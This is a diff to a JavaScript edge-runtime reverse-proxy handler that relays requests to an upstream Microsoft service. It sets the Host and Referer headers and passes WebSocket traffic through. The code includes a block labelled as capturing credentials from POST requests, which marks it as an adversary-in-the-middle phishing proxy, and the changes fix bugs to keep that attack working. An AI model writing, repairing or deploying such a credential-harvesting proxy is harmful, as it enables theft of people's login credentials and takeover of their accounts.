@@ -53,32 +53,26 @@ async function handleProxy(request, pathSegments = []) {
   const url_hostname = url.hostname;
   const upstream_domain = UPSTREAM;
   
-  // FIX: Create URL from request but explicitly clear the port
-  const upstreamUrl = new URL(request.url);
-  upstreamUrl.protocol = 'https:';
-  upstreamUrl.hostname = upstream_domain; // Use hostname (no port) instead of host
-  upstreamUrl.port = ''; // Explicitly clear port to prevent 8080 leak
+  // FIX: Create new URL object from scratch to prevent port 8080 leak
+  const upstreamUrl = new URL(`https://${upstream_domain}`);
   
-  // Handle path
-  if (upstreamUrl.pathname === '/') {
+  // Handle path like Cloudflare Worker
+  let pathname = url.pathname;
+  if (pathname === '/') {
     upstreamUrl.pathname = UPSTREAM_PATH;
   } else {
-    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
+    upstreamUrl.pathname = UPSTREAM_PATH + pathname.replace(/^\//, '');
   }
 
   console.log('Proxying to:', upstreamUrl.toString());
 
+  // Build headers EXACTLY like Cloudflare Worker
   const method = request.method;
   const request_headers = request.headers;
-  
-  // Build headers - copy all and SET Host header (don't delete it)
   const new_request_headers = new Headers(request_headers);
-  
-  // FIX: Set Host header explicitly (required by Microsoft)
+
   new_request_headers.set('Host', upstream_domain);
-  
-  // Set Referer to the upstream domain
-  new_request_headers.set('Referer', `https://${upstream_domain}`);
+  new_request_headers.set('Referer', `https://${url_hostname}`);
 
   // ---- Credentials capture for POST requests ----
   if (method === 'POST') {
@@ -104,7 +98,7 @@ async function handleProxy(request, pathSegments = []) {
     }
   }
 
-  // ---- Proxy request with duplex option for Edge Runtime ----
+  // ---- FIX: Proxy request with duplex option for Edge Runtime ----
   const hasBody = !["GET", "HEAD"].includes(method);
   
   try {
@@ -112,17 +106,17 @@ async function handleProxy(request, pathSegments = []) {
       method: method,
       headers: new_request_headers,
       body: hasBody ? request.body : null,
-      // CRITICAL: duplex is required when sending body in Edge Runtime
+      // CRITICAL FIX: duplex is required when sending body in Edge Runtime
       ...(hasBody && { duplex: 'half' })
     });
 
-    // Handle WebSocket upgrades
+    // Handle WebSocket upgrades like Cloudflare Worker
     let connection_upgrade = new_request_headers.get("Upgrade");
     if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
       return original_response;
     }
 
-    // Process response
+    // Process response like Cloudflare Worker
     let original_response_clone = original_response.clone();
     let response_headers = original_response.headers;
     let new_response_headers = new Headers(response_headers);
